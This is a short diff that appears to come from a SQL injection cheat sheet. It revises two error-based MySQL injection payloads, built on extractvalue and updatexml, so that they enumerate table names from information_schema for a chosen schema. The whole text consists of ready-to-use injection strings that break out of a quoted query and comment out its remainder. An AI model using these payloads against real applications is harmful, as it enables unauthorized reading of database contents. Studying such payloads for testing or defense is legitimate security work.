@@ -53,13 +53,13 @@ updatexml
 extractvalue
 
 ' AND extractvalue(1,concat('~',
-(SELECT table_name FROM information_schema.tables LIMIT 0,1)
+(SELECT table_name FROM information_schema.tables WHERE table_schema='database_name' LIMIT 0,1)
 ,'~'))-- -
 
 updatexml
 
 ' AND updatexml(1,concat('~',
-(SELECT table_name FROM information_schema.tables LIMIT 0,1)
+(SELECT table_name FROM information_schema.tables WHERE table_schema='database_name' LIMIT 0,1)
 ,'~'),1)-- -
 
 ---
